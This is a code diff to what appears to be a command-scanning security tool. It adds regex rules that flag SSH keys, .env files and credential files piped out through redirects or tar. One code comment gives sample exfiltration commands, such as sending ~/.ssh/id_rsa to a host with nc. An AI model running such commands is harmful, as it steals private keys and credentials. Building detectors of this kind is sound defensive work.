@@ -88,6 +88,14 @@ const GLOBAL_INSTALL_RE =
 const GIT_CLONE_RE = /\bgit\s+clone\b/i;
 const SCP_RE = /\bscp\b/i;
 const B64_RE = /\b(?:base64\s+-[a-z]*d\b|openssl\s+base64\s+-[a-z]*d\b)/i;
+// M-4: exfil without a read verb — secret material as redirect input
+// M-4: exfil without a read verb — secret material as redirect input
+// (`nc host 4444 < ~/.ssh/id_rsa`) or as a tar operand (`tar czf - ~/.ssh | …`).
+// `.env.example`-style templates are excluded, mirroring SECRET_PATH_RE.
+const SECRET_REDIRECT_RE =
+  /<\s*[^\s;&|"'<>]*?(?:\.ssh|\.env(?!\.(?:example|sample|template|dist))|id_rsa|\.pem|credentials|shadow)[^\s;&|"'<>]*/i;
+const TAR_SECRET_RE =
+  /\btar\b[^|;&]*(?:\.ssh|\.env(?!\.(?:example|sample|template|dist))|id_rsa|\.pem|credentials|shadow)/i;
 // Inline eval flags: -c (python; php -c is a config path, flagged fail-safe),
 // -e (node/perl/ruby), -p (node print, php), -r (php run). Long forms
 // (--eval) and no-space forms are out of scope (residual, documented).
@@ -141,6 +149,13 @@ function fileMediatedExec(command: string): Finding | null {
   }
   return null;
 }
+
+/** M-4: any per-segment signal of secret material as input: read verb +
+ * secret path, secret path via `<` redirect, or tar operand on a secret path. */
+const hasSecretInput = (s: string): boolean =>
+  (READ_RE.test(s) && SECRET_PATH_RE.test(s)) ||
+  SECRET_REDIRECT_RE.test(s) ||
+  TAR_SECRET_RE.test(s);
 
 /** Per-segment action rules; destructive and privilege findings come first. */
 function classifySegment(text: string): Finding[] {
@@ -224,7 +239,8 @@ export function scanCommand(command: string): ScanResult {
       segData[i].pipedToShell = segData.slice(i + 1).some((s) => s.isShell);
     }
     const chainNetwork = segData.some((s) => DL_TOOLS_RE.test(s.seg.text));
-    const chainSecretRead = segData.some((s) => READ_RE.test(s.seg.text) && SECRET_PATH_RE.test(s.seg.text));
+    // M-4: secret material via read verb, < redirect, or tar operand.
+    const chainSecretRead = segData.some((s) => hasSecretInput(s.seg.text));
     for (const d of segData) {
       const excerpt = d.seg.text.trim().replace(/\s+/g, " ").slice(0, 80);
       // H-5: decode segment content and scan it as a command (base64/hex/url).
